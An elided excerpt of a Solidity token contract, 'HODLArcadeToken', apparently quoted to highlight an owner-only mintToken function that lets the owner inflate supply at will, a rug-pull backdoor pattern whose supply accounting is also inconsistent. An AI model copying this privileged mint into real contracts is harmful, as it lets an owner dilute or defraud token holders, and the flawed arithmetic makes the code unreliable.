...
contract HODLArcadeToken is Context, IERC20, Ownable {
    ...
    address payable public marketingAddress =
        payable(0x778558ED5BF5eBea47BAfed9BE2d58f34b6d482a); // Marketing Address
    ...
    constructor() {
        ...
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x8954AfA98594b838bda56FE4C12a09D7739D179b //Quickswap Router address
        );
        uniswapV2Pair = IUniswapV2Factory(0x5757371414417b8C6CAad45bAeF941aBc7d3Ab32)
    ...
    function mintToken(address to, uint256 mintAmt) external onlyOwner {
        _tTotal += mintAmt * 1 ether;
        _transfer(address(0), to, mintAmt);
    }
